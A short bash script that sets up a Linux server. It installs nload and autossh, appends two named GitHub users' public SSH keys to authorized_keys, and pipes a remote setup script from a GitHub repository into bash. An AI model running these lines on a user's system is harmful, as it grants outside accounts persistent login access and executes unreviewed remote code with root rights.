#!/bin/bash
apt update && apt upgrade -y
apt install -y nload autossh 
mkdir ~/.ssh
cat keys >> ~/.ssh/authorized_keys
curl https://github.com/samsesh.keys >> ~/.ssh/authorized_keys
curl https://github.com/royalhaze.keys >> ~/.ssh/authorized_keys
curl https://raw.githubusercontent.com/malkemit/namizun/master/else/setup.sh | bash